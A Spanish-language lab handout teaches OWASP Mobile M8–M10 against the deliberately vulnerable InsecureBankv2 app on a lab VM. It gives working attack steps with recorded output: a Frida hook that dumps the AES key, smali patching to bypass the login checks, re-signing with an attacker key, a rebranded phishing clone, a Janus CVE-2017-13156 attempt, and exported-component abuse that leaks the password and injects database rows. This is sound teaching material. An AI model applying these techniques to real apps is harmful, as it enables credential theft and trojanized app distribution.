# Clase 3 — OWASP Mobile Top 10: M8, M9 y M10

> **Estado del documento: verificado.** Todo lo que hay aquí se ejecutó contra
> la VM del laboratorio (`172.25.208.100:5555`, Android 8.1.0, API 27) y contra
> la APK real de InsecureBankv2. Las salidas son transcripciones literales, no
> ejemplos inventados. La transcripción completa, con las salidas crudas de cada
> comando, está en [`clase-3-evidencia.md`](clase-3-evidencia.md).
>
> Los comandos marcados con ✅ se ejecutaron y su salida es real. Cuando algo
> **no** funcionó, se dice explícitamente en lugar de ocultarlo: hay tres
> secciones marcadas como ❌ justo para eso, porque un ataque que no completas
> enseña tanto como uno que sí.

| | |
|---|---|
| **App objetivo** | InsecureBankv2 (`com.android.insecurebankv2`) |
| **Proyecto** | Dinesh Shetty — referenciado por OWASP MASTG como `MASTG-APP-0010` |
| **Dispositivo** | VM Android-x86, Android 8.1.0 (API 27), x86_64, root por ADB |
| **Duración prevista** | 120 minutos |
| **Riesgos** | M8 Code Tampering · M9 Reverse Engineering · M10 Extraneous Functionality |
| **Herramientas** | JADX · apktool · apksigner · d8 · frida-server 17.19.0 |

## Índice

- [Antes de impartir la clase](#antes-de-impartir-la-clase)
- [Fase 0 — Preparación](#fase-0--preparación)
- [Fase 1 — M9: Reverse Engineering](#fase-1--m9-reverse-engineering)
- [Fase 2 — M8: Code Tampering](#fase-2--m8-code-tampering)
- [Fase 3 — M10: Funcionalidad extraña](#fase-3--m10-funcionalidad-extraña)
- [Cierre](#cierre)
- [Anexo A — Guion de ataque encadenado](#anexo-a--guion-de-ataque-encadenado)
- [Anexo B — Reparación](#anexo-b--reparación)

---

## Antes de impartir la clase

> ⚠️ **A diferencia de la Clase 1 y la 2, esta clase necesita `apktool`, que el
> instalador del laboratorio NO pone por defecto.** Está en los repos de Ubuntu,
> así que se instala en un segundo (Fase 0), pero si impartes la clase antes de
> pasar por ahí, la Fase 2 entera se cae.

### Requisitos previos

| Componente | Estado | Verificación |
|---|---|---|
| JADX | Instalado por el laboratorio | `jadx --version` |
| apktool | **Hay que instalarlo** (Fase 0) | `apktool --version` |
| apksigner | En build-tools, **fuera del PATH** | `ls /opt/android-sdk/build-tools/*/apksigner` |
| d8 | En build-tools, fuera del PATH | `ls /opt/android-sdk/build-tools/*/d8` |
| frida-server | Corriendo en la VM | `vmconnect frida` |
| Backend | Corriendo en el servidor | `systemctl is-active insecurebankv2-server` |

### Material que produce la clase

| Artefacto | Qué es |
|---|---|
| `reports/hook-m9-clave.js` | Hook de Frida que imprime la clave AES en memoria |
| `reports/InsecureBankv2_mod2_signed.apk` | La app parcheada y firmada por "el atacante" |
| `reports/attacker.keystore` | El keystore con el que se firmó |
| `reports/clase3/prepend.py` | Script del intento Janus |
| `reports/clase3/classes.dex` | El DEX malicioso del intento Janus |

---

## Fase 0 — Preparación

### 0.1 Instalar `apktool`

`apktool` es el punto flaco del laboratorio: el script de instalación solo lo
instala con la opción `--extras`, así que una instalación normal se queda sin
él. Está en los repos de Ubuntu 24.04:

```bash
sudo apt-get install -y apktool
apktool --version
# salida real: 2.7.0-dirty
```

> El sufijo `-dirty` es normal en el paquete de Ubuntu: significa que Debian
> parcheó el código original. No afecta al funcionamiento.

### 0.2 Poner `apksigner` y `d8` en el PATH

Viven en build-tools pero no están enlazados. Carga el SDK y añade el directorio:

```bash
source /etc/profile.d/android-sdk.sh
export PATH="$PATH:/opt/android-sdk/build-tools/33.0.2"
which apksigner d8
```

> ⚠️ **Este `export` solo vive en la shell actual.** Si abres otra terminal, hay
> que repetirlo. Es la causa nº1 de "`apksigner: command not found`" durante la
> clase.

### 0.3 Estado inicial: la app original, sin tocar

Antes de empezar, comprueba que estás sobre la APK original. Importante, porque
la Fase 2 la sustituye:

```bash
apksigner verify --print-certs ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
  | grep 'DN:'
# salida real:
#   Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA
```

> Guarda ese nombre. En la Fase 2 vas a ver que cambia por `CN=Attacker`, y esa
> diferencia **es** el hallazgo de M8.

### 0.4 ¿Está la app instalada y con la IP del servidor?

```bash
D="-s 172.25.208.100:5555"
adb $D shell pm list packages | grep insecurebankv2
adb $D shell "cat /data/data/com.android.insecurebankv2/shared_prefs/com.android.insecurebankv2_preferences.xml" \
  | grep -E 'serverip|serverport'
```

Si el fichero no existe o no lo puede leer la app, la app arranca en la pantalla
`FilePref` y no llega al login. **No lo resuelvas empujando el fichero con
`adb push`**: el fichero queda propiedad de root y la app (que corre como
`u0_a75`) no puede leerlo, así que volverá a `FilePref` con el valor por defecto
`10.0.2.2`. Escríbelo a mano en la pantalla:

```bash
adb $D shell am start -n com.android.insecurebankv2/.FilePrefActivity
# Server IP:   -> 172.25.208.104   (campo en [138,92][632,129])
# Server Port: -> 8888             (campo en [138,163][632,200])
# Submit:                           (botón  en [4,252][636,314])
```

---

## Fase 1 — M9: Reverse Engineering

**M9 es el prerrequisito de los otros dos.** Si no sabes leer el código de una
app, no puedes parchearla (M8) ni saber qué functionality sobra (M10). Por eso
esta fase va primera aunque el guion la presente después.

### 1.1 La clave criptográfica, en texto claro

La app cifra las credenciales con AES. Vamos a por la clave:

```bash
cd ~/mobile-owasp-lab/reports/jadx/InsecureBankv2
sed -n '15,30p' sources/com/android/insecurebankv2/CryptoClass.java
```

✅ **Salida real** (recortada a lo importante):

```java
public class CryptoClass {
    String key = "This is the super secret key 123";
    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    ...
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

Tres fallos en cuatro líneas:

| Qué | Dónde | Por qué es un fallo |
|---|---|---|
| Clave embebida en el código | `CryptoClass.java:22` | Va en la APK. Cualquiera que la descargue la tiene. **M4** |
| IV de 16 ceros | `CryptoClass.java:23` | El IV debe ser aleatorio y único por cifrado. Con ceros, dos textos claros iguales dan el mismo cifrado, yKnown-plaintext permite recuperar la clave. **M4** |
| `AES/CBC` sin autenticar | `CryptoClass.java:28` | CBC no detecta manipulación. Debería ser GCM. **M4** |

> **Punto clave de M9:** el secreto no está "protegido" en ningún sitio. No hay
> ofuscación, ni native, ni nada. Lo único que hay es que el fichero se llama
> `.java` en vez de `.class`, y eso lo arregla un `jadx` cualquiera.

### 1.2 Qué métodos existen de verdad

El paso siguiente es querer interceptar el cifrado con Frida, y ahí es fácil
equivocarse. Los métodos reales son:

```bash
grep -oE 'public [a-zA-Z\[\]]+ [a-zA-Z]+\(' \
  sources/com/android/insecurebankv2/CryptoClass.java
```

✅ **Salida real**:

```
public static byte[] aes256encrypt(
public static byte[] aes256decrypt(
public String aesDeccryptedString(
public String aesEncryptedString(
```

> ⚠️ **Ojo con `aesDeccryptedString`: doble `c`.** Es una errata del autor de la
> app y hay que respetarla. Un hook sobre `aesDecryptedString` (bien escrito)
> **no da ningún error y simplemente nunca se dispara**, que es la forma más
> engañosa de perder media hora pensando que Frida está roto.

### 1.3 La clave en memoria, con Frida ✅

El análisis estático (M9) te da la clave leyendo. El análisis dinámico te la da
*viéndola*: la clave existe en memoria como un `String` de Java mientras la app
cifra, y eso no lo puede evitar la app.

```bash
cp ~/mobile-owasp-lab/reports/hook-m9-clave.js .
frida -U -p $(adb -s 172.25.208.100:5555 shell pidof com.android.insecurebankv2 | tr -d '\r') \
  -l hook-m9-clave.js
```

> 💡 **Adjunta por PID, no con `-f`.** Con `frida -f` (spawn) hay una carrera: el
> script se instala cuando el runtime está listo, pero la app puede haber
> ejecutado ya su `onCreate`. En InsecureBankv2 el `onCreate` de `LoginActivity`
> descifra la credencial guardada (`LoginActivity.java:87`), así que con `-f` te
> lo pierdes. Arranca la app, y luego adjunta por PID.

Deja el hook esperando y haz un login válido desde la VM:

```bash
adb -s 172.25.208.100:5555 shell input tap 320 102   # usuario
adb -s 172.25.208.100:5555 shell input text "dinesh"
adb -s 172.25.208.100:5555 shell input tap 320 171   # contraseña
adb -s 172.25.208.100:5555 shell input text "Dinesh@123\$"
adb -s 172.25.208.100:5555 shell input keyevent 111  # cerrar teclado
adb -s 172.25.208.100:5555 shell input tap 320 234   # Login
```

✅ **Salida real del hook**:

```
=========================================================
 M9 — Interceptando el cifrado de com.android.insecurebankv2.CryptoClass
=========================================================

 Hooks activos. Haz login (o dispara el receptor de SMS) y mira
 lo que aparece arriba.
=========================================================
  [M9] aesEncryptedString  (cifrando)  <-  "Dinesh@123$"
        clave en memoria : "This is the super secret key 123"
        IV en memoria    : 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
```

Ahí está **M4 entero en tres líneas**: la contraseña en claro, la clave que la
protege y el IV que la hace predecible. Ninguna de las tres estaba protegida.

### 1.4 Y la dirección inversa: el descifrado

El mismo hook captura el descifrado. Se dispara desde el receptor de SMS (que se
explica en la Fase 3), así que adelántate y ejecútalo:

```bash
adb -s 172.25.208.100:5555 shell am broadcast \
  -n com.android.insecurebankv2/.MyBroadCastReceiver \
  --es phonenumber "+34600000000" --es newpass "PRUEBA-M9"
```

✅ **Salida real del hook**:

```
  [M9] aesDeccryptedString (descifrando)  <-  "DTrW2VXjSoFdg0e61fHxJg=="
        clave en memoria : "This is the super secret key 123"
```

Lo que entra es el Base64 guardado en las preferencias; lo que sale, y lo que el
sistema registra, es la contraseña real:

```bash
adb -s 172.25.208.100:5555 logcat -d | grep 'For the changepassword'
```

✅ **Salida real**:

```
System.out: For the changepassword - phonenumber: +34600000000 password is: Updated Password from: Dinesh@123$ to: PRUEBA-M9
```

> 📌 `DTrW2VXjSoFdg0e61fHxJg==` es el mismo valor que hay en
> `shared_prefs/mySharedPreferences.xml` bajo `superSecurePassword`. Las dos
> piezas ya no son ninguna secreto por separado: juntas son la credencial.

### 1.5 El manifiesto: la superficie de ataque

M9 no es solo leer el código: es entender **qué parte de la app está abierta al
resto del dispositivo**. Esto ya sale del código y entra en M1/M7, pero se
descubre leyendo:

```bash
python3 - <<'PY'
import xml.etree.ElementTree as ET
ns='{http://schemas.android.com/apk/res/android}'
r=ET.parse('resources/AndroidManifest.xml').getroot()
for c in list(r.find('application')):
    tag=c.tag.split('}')[-1]
    if c.get(ns+'exported')=='true':
        print(f"  {tag:9} {c.get(ns+'name')}")
PY
```

✅ **Salida real** — seis componentes alcanzables desde fuera:

```
  activity   com.android.insecurebankv2.PostLogin
  activity   com.android.insecurebankv2.DoTransfer
  activity   com.android.insecurebankv2.ViewStatement
  activity   com.android.insecurebankv2.ChangePassword
  provider   com.android.insecurebankv2.TrackUserContentProvider
  receiver   com.android.insecurebankv2.MyBroadCastReceiver
```

Y dos banderas que en una app real no deberían estar:

```bash
grep -oE 'android:(debuggable|allowBackup)="[^"]*"' resources/AndroidManifest.xml
```

✅ **Salida real**:

```
android:allowBackup="true"
android:debuggable="true"
```

`debuggable="true"` es M9 con formato de banderín: cualquiera con ADB puede
adjuntar un depurador al proceso y leer memoria y registros. `allowBackup="true"`
permite extraer las preferencias de la app con `adb backup`.

---

## Fase 2 — M8: Code Tampering

Ahora que lees el código, vamos a cambiarlo. **M8 no consiste en "hackear la
app": consiste en que la app que ejecuta el usuario ya no es la que el
desarrollor firmó.**

### 2.1 Desensamblar a smali

```bash
cd ~/mobile-owasp-lab/reports
apktool d ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk -o InsecureBankv2_mod -f
```

✅ **Salida real**:

```
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files/dir...
I: Copying original files...
```

> `apktool` no produce Java, produce **smali**, el ensamblador de Dalvik. Trabajar
> sobre smali parece peor, pero es la única forma fiable de modificar una app que
> no tienes su código fuente ni sus claves de compilación.

### 2.2 Localizar el chequeo de autenticación ✅

El login se decide en `DoLogin$RequestTask`, en el método `postData`. Las
puertas están en el smali, no en el Java que vimos en JADX:

```bash
grep -n 'Correct Credentials' \
  InsecureBankv2_mod/smali/com/android/insecurebankv2/DoLogin\$RequestTask.smali
```

✅ **Salida real**:

```
613:    const-string v9, "Correct Credentials"
615:    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
```

Contexto, en las líneas 605-630:

```smali
    if-eqz v8, :cond_0              # PUERTA 1: la respuesta llegó nula?
    ...
    const-string v9, "Correct Credentials"
    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
    move-result v8
    const/4 v9, -0x1
    if-eq v8, v9, :cond_2           # PUERTA 2: no encontró la frase buena?
    .line 141
    ...                              # camino de "login correcto"
```

**Hay dos puertas, no una.** Puerta 1 salta si `result` es nulo (servidor caído).
Puerta 2 salta si la respuesta no contiene `"Correct Credentials"`. Atacar solo
una parece suficiente hasta que pruebas la otra.

### 2.3 Parchear las dos puertas

Sustituimos cada salto de error por un `nop`, dejando el original escrito arriba
como documentación:

```bash
F='InsecureBankv2_mod/smali/com/android/insecurebankv2/DoLogin$RequestTask.smali'
python3 - "$F" <<'PY'
import sys
p=sys.argv[1]; s=open(p,encoding='utf-8').read()

puertas = [
  ("""    if-eqz v8, :cond_0

    .line 141
""",
   """    # ===== MODIFICADO (M8 Code Tampering), PUERTA 1 =====
    # Original:  if-eqz v8, :cond_0
    # Sin respuesta del servidor, 'result' llega null y saltaba a :cond_0.
    nop
    # =====================================================

    .line 141
"""),
  ("""    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    const/4 v9, -0x1

    if-eq v8, v9, :cond_2
""",
   """    invoke-virtual {v8, v9}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    const/4 v9, -0x1

    # ===== MODIFICADO (M8 Code Tampering), PUERTA 2 =====
    # Original:  if-eq v8, v9, :cond_2
    # El rechazo ya no salta a la rama de error: el flujo cae siempre en el
    # camino de "login correcto", acertado o no.
    nop
    # =====================================================
"""),
]
for viejo, nuevo in puertas:
    assert viejo in s, f"no encontrado:\n{viejo}"
    s = s.replace(viejo, nuevo, 1)
open(p,'w',encoding='utf-8').write(s)
print("las dos puertas parcheadas")
PY
```

✅ **Salida real**: `las dos puertas parcheadas`

Y el parche en el fichero:

```
622-    # Original:  if-eq v8, v9, :cond_2
625:    nop
```

### 2.4 Reconstruir y firmar con una clave que NO es del desarrollador

```bash
export PATH="$PATH:/opt/android-sdk/build-tools/33.0.2"
apktool b InsecureBankv2_mod -o InsecureBankv2_mod2.apk

# La clave del atacante
keytool -genkeypair -v -keystore attacker.keystore -alias attacker \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass attacker123 -keypass attacker123 \
  -dname "CN=Attacker, OU=Fake, O=EvilCorp, L=Nowhere, C=XX"

apksigner sign --ks attacker.keystore --ks-key-alias attacker \
  --ks-pass pass:attacker123 --key-pass pass:attacker123 \
  --out InsecureBankv2_mod2_signed.apk InsecureBankv2_mod2.apk
```

✅ **Salida real** de `apktool b`:

```
I: Building resources...
I: Building apk file...
I: Built apk into: InsecureBankv2_mod2.apk
```

Ahora la comparación que **es** el hallazgo:

```bash
apksigner verify --verbose --print-certs \
  ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk | grep -E 'Verified using v1|DN:'
apksigner verify --verbose --print-certs \
  InsecureBankv2_mod2_signed.apk | grep -E 'Verified using v[123]|DN:'
```

✅ **Salida real**:

```
# ORIGINAL
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA

# MODIFICADA
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true
Verified using v3 scheme (APK Signature Scheme v3): true
Signer #1 certificate DN: CN=Attacker, OU=Fake, O=EvilCorp, L=Nowhere, C=XX
```

Dos cosas para comentar en clase:

1. **El firmante es otro.** La app que va a instalar el usuario la ha firmado
   `CN=Attacker`, no el desarrollador. Todo lo que el usuario "confía" de ella
   —updates, permiso para acceder a sus datos— se lo ha entregado un desconocido.
2. **La re-firma añadió v2 y v3.** `apksigner` lee el `minSdkVersion` del
   manifiesto y, al firmar, aplica los esquemas modernos. Es decir: el acto de
   falsificar la app **arregló** por el camino el problema de firma que tenía
   (ver §2.8). Seguridad e integridad disjuntas: una arregla lo que la otra rompe.

### 2.5 Instalar y demostrar ✅

Como la firma es distinta, hay que desinstalar antes (si no, Android rechaza la
actualización por conflicto de firma):

```bash
D="-s 172.25.208.100:5555"
adb $D uninstall com.android.insecurebankv2
adb $D install InsecureBankv2_mod2_signed.apk
```

✅ **Salida real**: `Success`

Ahora el control, que es lo que da valor a la demostración. **Qué responde
realmente el servidor** a un usuario que no existe:

```bash
curl -s -X POST -d 'username=usuario-inexistente&password=basura' \
  http://127.0.0.1:8888/login
```

✅ **Salida real**:

```json
{"message": "User Does not Exist", "user": "usuario-inexistente"}
```

El servidor dice que no. Ahora mete esas mismas credenciales en la app parcheada:

```bash
adb $D shell am start -n com.android.insecurebankv2/.LoginActivity
adb $D shell input tap 320 102; adb $D shell input text "usuario-inexistente"
adb $D shell input tap 320 171; adb $D shell input text "basura"
adb $D shell input keyevent 111
adb $D shell input tap 320 234
```

✅ **Salida real**: estás en `PostLogin`, con `Transfer`, `View Statement` y
`Change Password` a la vista. El sistema además lo registra (§M6):

```bash
adb $D logcat -d | grep 'Successful Login'
```

✅ **Salida real**:

```
D Successful Login:: , account=usuario-inexistente:basura
```

**El servidor rechazó el login y la app-modified lo aceptó y lo anotó como
correcto.** Eso es M8: la validación vive en el cliente, y el cliente es
modificable.

### 2.6 ❌ Lo que NO funciona: apagar el servidor

Aquí conviene ser honesto, porque es la parte que más engaña en una demo.

```bash
sudo systemctl stop insecurebankv2-server
# login con cualquier cosa...
```

✅ **Salida real: la app NO entra.** Se queda en la pantalla de login.

¿Por qué, si parcheé las dos puertas? Porque el chequeo **vive dentro del
`try`** de `postData`, en el mismo bloque que la llamada de red:

```java
public void postData(String valueIWantToSend) throws ... IOException ... {
    ...
    responseBody = httpclient.execute(httppost);     // <- si el servidor no está, salta
    ...
    if (DoLogin.this.result != null) {                 // <- y nos vamos por aquí
        if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
            saveCreds(...);
```

Si el servidor no responde, la excepción salta **antes** de llegar al código
parcheado. Los `nop` que puse nunca se ejecutan.

**La lección real:** M8 consiste en dejar de cubrir **todos** los caminos. Un
parche parcial da una falsa sensación de éxito. Un atacante de verdad sustituye
el cuerpo del método entero, o engancha el resultado con Frida — que es
exactamente lo que se hizo en la Clase 2.

> Vuelve a levantar el servidor antes de continuar:
> `sudo systemctl start insecurebankv2-server`

### 2.7 M8 de identidad: renombrar la app

El ataque más visible de todos, y el que más pasa en la vida real — phishing
con distributing una app falsa:

```bash
sed -i 's|<string name="app_name">InsecureBankv2</string>|<string name="app_name">BancoSeguro OFICIAL</string>|' \
  InsecureBankv2_mod/res/values/strings.xml
```

✅ **Salida real**, con la app instalada, en la barra de título y en el login:

```
text="BancoSeguro OFICIAL"
text="dinesh"
text="••••••••"
text="Login"
```

Y el nombre va **dentro** de la APK, no es una etiqueta del launcher:

```bash
unzip -p InsecureBankv2_mod2_signed.apk resources.arsc | strings | grep BancoSeguro
# BancoSeguro OFICIAL
```

> El nombre no es lo que el usuario ve. Lo que el usuario ve es lo que el
> atacante escribió dentro del binario que tú firmaste... o él firmó.

### 2.8 Bonus: el ataque Janus, y por qué aquí **no** funciona ❌

En la Clase 2 se vio que la APK original está firmada **solo con v1**. El
esquema v1 (JAR signing) tiene una debilidad documentada como
**CVE-2017-13156, "Janus"**: firma el contenido de las entradas del ZIP, pero
**no los bytes que hay antes de la primera entrada**. Se puede prepender un DEX
sin romper la firma.

Vamos a comprobarlo de verdad, porque aquí es donde la gente se emociona y
concluye de más.

**Paso 1: fabricar el DEX malicioso**, que sustituye la clave de M4:

```java
// reports/clase3/janus-src/CryptoClass.java
package com.android.insecurebankv2;

public class CryptoClass {
    public CryptoClass() {}
    public String aesEncryptedString(String theString) {
        return "JANUS-CLAVE-DEL-ATACANTE";
    }
    public String aesDeccryptedString(String theString) {
        return "JANUS-DESCIFRADO";
    }
}
```

```bash
cd ~/mobile-owasp-lab/reports/clase3
javac -d classes janus-src/com/android/insecurebankv2/CryptoClass.java
d8 --min-api 15 --output . classes/com/android/insecurebankv2/CryptoClass.class
ls -l classes.dex
```

✅ **Salida real**: `-rw-rw-r-- 1 cwl cwl 856 Oct  4 03:48 classes.dex`

**Paso 2: prependerlo y arreglar el directorio central** (`prepend.py`, ya en
`reports/clase3/`). Al desplazar todo N bytes, las direcciones de las cabeceras
locales que declara el directorio central quedan desfasadas:

```
DEX prependido: 856 bytes; dir. central en 3408268 -> 3409124
entradas del dir. central reubicadas: 555
escrito InsecureBankv2_janus.apk: 3463285 bytes
```

**Paso 3: ¿sigue siendo válida la firma original?** ✅

```
Verified using v1 scheme (JAR signing): true
```

**Y el contenido es byte a byte el mismo** ✅:

```
AndroidManifest.xml: IDÉNTICO
  sha256 1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9
  sha256 1c837665af41be7d51cfa8475106e69f14aee6342f4df81f39273b8ae64fcaf9
0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex
0eb27df9847d5709df0cd2677baaf66ee3226e45b132149dc3039456dde79533  classes.dex
```

Esto es **Janus funcionando a medias**, y hay que decirlo así: el esquema de
firma v1 de verdad no protege de bytes prependidos, y `apksigner` lo confirma.

**Paso 4: ¿instala Android el resultado?** ❌ **No.**

```
adb install InsecureBankv2_janus.apk
# Failure [INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION: Failed to parse
#  /data/app/vmdl41843812.tmp/base.apk: AndroidManifest.xml]
```

Y el motivo concreto:

```
W PackageParser: Failed to parse /data/app/vmdl41843812.tmp/base.apk
W PackageParser: java.io.FileNotFoundException: AndroidManifest.xml
W PackageParser:  at android.content.res.AssetManager.openXmlAssetNative(Native Method)
```

El parser de paquetes de Android 8.1 busca el manifiesto como un *asset* del
ZIP y no lo encuentra en un fichero con bytes prependidos. Ni siquiera tried la
variante sin corregir el directorio central: mismo `FileNotFoundException`. Y la
APK original, como control, instala bien.

**Y aquí viene lo bonito: el límite de versiones encaja exactamente.** NVD
documenta CVE-2017-13156 como afecta a Android **5.1.1 a 8.0**. Nuestra VM es
Android **8.1.0**. El fallo observado es el punto exacto donde termina el
rango documentado, comprobado de forma independiente.

> **Conclusión honesta, y es una conclusión buena:**
> - ✅ La firma solo-v1 **no** protege contra bytes ajenos prependidos.
> - ✅ `apksigner verify` lo confirma, con contenidos byte-idénticos.
> - ❌ El parser del paquete de Android 8.1 **sí** lo bloquea.
> - ✅ Por eso v2/v3 importan: la documentación de AOSP dice que v1 «no protege
>   algunas partes de la APK, como los metadatos del ZIP», y que v2 «tiene en
>   cuenta todos los bytes del fichero APK».
>
> No digas "Janus funciona aquí". Di: **el esquema v1 es genuinamente débil, y el
> trabajo de documentarlo con precisión es parte de lo que hay que entregar.**

### 2.9 Restaurar la app original

La clase 3 deja la APK troyanizada instalada. Antes de cerrar:

```bash
adb -s 172.25.208.100:5555 uninstall com.android.insecurebankv2
adb -s 172.25.208.100:5555 install ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
apksigner verify --print-certs ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk | grep 'DN:'
# Signer #1 certificate DN: CN=Dinesh Shetty, OU=Services, O=SI, L=Boston, ST=MA
```

---

## Fase 3 — M10: Funcionalidad extraña

**M10: la app hace más que lo que su función necesita.** Debugornos que se
quedaron, backdoors, endpoints de desarrollo, SDKs de terceros que nadie
revisó. En una app financiera todo esto es dinero para el atacante.

### 3.1 El backdoor más evidente: `/devlogin` ✅

Visto en la Clase 2, repetido aquí porque es el ejemplo canónico. En
`DoLogin.java:103`:

```java
if (DoLogin.this.username.equals("devadmin")) {
```

Si el usuario es `devadmin`, la app **no pregunta nada al servidor**. El
atacador ni necesita la contraseña. ✅ Salida real:

```bash
curl -s -X POST -d 'username=devadmin&password=cualquier-cosa' \
  http://127.0.0.1:8888/devlogin
# {"message": "Correct Credentials", "user": "devadmin"}
```

Eso es **M10 puro**: funcionalidad de desarrollo que sobrevivió a producción, y
**M3**: bypass completo de autenticación.

### 3.2 Bypass de autenticación sin tocar la app: `PostLogin` exportada ✅

De los seis componentes exportados, `PostLogin` es el más grave. No hace falta
modificar nada: solo lanzar la actividad.

```bash
D="-s 172.25.208.100:5555"
adb $D shell am force-stop com.android.insecurebankv2
adb $D shell input keyevent 3          # al launcher: fuera de la app
adb $D shell am start -n com.android.insecurebankv2/.PostLogin
```

✅ **Salida real**:

```
Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin }
...
text="PostLogin"
text="Transfer"
text="View Statement"
text="Change Password"
text="Rooted Device!!"
```

**Desde el launcher, sin usuario, sin contraseña, dentro de la zona
autenticada.** El mismo resultado que §2.5 pero sin una sola línea de
parcheo.

Y para rematar: `DoTransfer` también está exportada, así que el bypass no se
queda en ver el saldo.

> **Por qué es M10 y por qué es M1/M7:** la app declara `exported="true"` en una
> actividad que debería ser privada. No es un fallo de lógica: es un fallo de
> *declaración de superficie*, que es exactamente de lo que habla M1
> (Improper Platform Usage) y M7 (Insecure Coding).

### 3.3 El hallazgo grande: un receptor exportado que manda tu contraseña por SMS ✅

Este es el resultado más serio de la clase, y no requiere instrumentación.

`MyBroadCastReceiver` está declarado `exported="true"` **sin ningún permiso**.
Cualquier app del dispositivo puede enviarle un `Intent`. Lo que hace con él:

```java
// MyBroadCastReceiver.java:24-33
String password = settings.getString("superSecurePassword", null);
CryptoClass crypt = new CryptoClass();
String decryptedPassword = crypt.aesDeccryptedString(password);   // M4
String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
SmsManager smsManager = SmsManager.getDefault();
smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
```

Lee la contraseña cifrada, **la descifra con la clave embebida** y **la envía por
SMS al número que le indiquen**. Demostración, desde fuera de la app:

```bash
D="-s 172.25.208.100:5555"
adb $D logcat -c
adb $D shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
  --es phonenumber "+34600000000" --es newpass "ATACANTE-DICE-ESTO"
```

✅ **Salida real**:

```
Broadcasting: Intent { flg=0x400000 cmp=com.android.insecurebankv2/.MyBroadCastReceiver (has extras) }
Broadcast completed: result=0

System.out: For the changepassword - phonenumber: +34600000000 password is: Updated Password from: Dinesh@123$ to: ATACANTE-DICE-ESTO
```

**La contraseña en claro, en el log del sistema, dirigida al número del atacante.**

Encadena cuatro riesgos del OWASP Mobile Top 10 en un solo componente:

| | |
|---|---|
| **M4** | Clave AES embebida, usada para descifrar |
| **M7** | Receptor sin validación ni permiso, expuesto a cualquier app |
| **M10** | Funcionalidad (cambio de contraseña) convertida en canal de exfiltración |
| **M6** | El `System.out.println` escribe la contraseña en el log del sistema |

> 📌 **Matiz importante, y hay que decirlo en clase:** el `logcat` lo ve
> cualquiera con ADB o acceso root. En un dispositivo real, la app tiene además
> `SEND_SMS` declarado, así que el SMS **intentaría** enviarse de verdad; que se
> que se entregue o no depende de la SIM y del operador. Lo que queda **demostrado** es
> la parte que importa: la descifrase y la entrega al canal de salida.

### 3.4 El ContentProvider sin ningún permiso ✅

El provider de tracking de usuarios también es `exported="true"`, y esta es la
lista de sus permisos:

```bash
python3 - <<'PY'
import xml.etree.ElementTree as ET
ns='{http://schemas.android.com/apk/res/android}'
r=ET.parse('resources/AndroidManifest.xml').getroot()
for p in r.find('application').findall('provider'):
    req=[p.get(ns+k) for k in ('readPermission','writePermission','permission') if p.get(ns+k)]
    print("  exported:", p.get(ns+'exported'), "| permisos exigidos:", req or "NINGUNO")
PY
```

✅ **Salida real**:

```
  exported: true | permisos exigidos: NINGUNO
```

Y se puede **leer y escribir** desde fuera:

```bash
U=content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
adb $D shell content query --uri "$U"
```

✅ **Salida real**:

```
Row: 0 id=11, name=devadmin
Row: 1 id=15, name=devadmin
Row: 2 id=12, name=dinesh
```

```bash
adb $D shell content insert --uri "$U" --bind name:s:injectado
adb $D shell content query --uri "$U" | tail -1
```

✅ **Salida real**:

```
Row: 11 id=22, name=injectado
```

Cualquier app puede **inyectar** filas en la base de datos de la app bancaria.

> Ojo con las comillas al borrar, o `content delete` interpreta el valor como
> columna:
> ```bash
> adb $D shell "content delete --uri \"$U\" --where \"name='injectado'\""
> ```
> Sin las comillas: `SQLiteException: no such column: injectado (code 1)`.

### 3.5 SDKs de terceros que nadie pidió ✅

En una app de banca hay publicidad y billetera:

```bash
grep -oE 'android:name="com\.google\.android\.gms\.[^"]*"' \
  resources/AndroidManifest.xml | sort -u
```

✅ **Salida real**:

```
com.google.android.gms.ads.AdActivity
com.google.android.gms.ads.purchase.InAppPurchaseActivity
com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION
com.google.android.gms.wallet.EnableWalletOptimizationReceiver
com.google.android.gms.wallet.api.enabled
```

Son SDKs que la app no necesita para mover dinero, pero que traen sus propios
componentes, permisos y código. **M10 otra vez**, y además **cadena de
suministro**: confías en el comportamiento de terceros sin auditarlo.

### 3.6 Detección de root como *funcionalidad*

En `PostLogin.java:58`:

```java
this.root_status.setText("Rooted Device!!");
```

La app detecta que el dispositivo está rooteado y... **solo escribe un texto**.
No bloquea nada, no cierra la sesión, no limita operaciones. Es detección de
root decorativa: cumple para la captura de pantalla y no para la seguridad.

---

## Cierre

> - **M9 (Reverse Engineering):** en cinco minutos JADX devolvió la clave AES, el
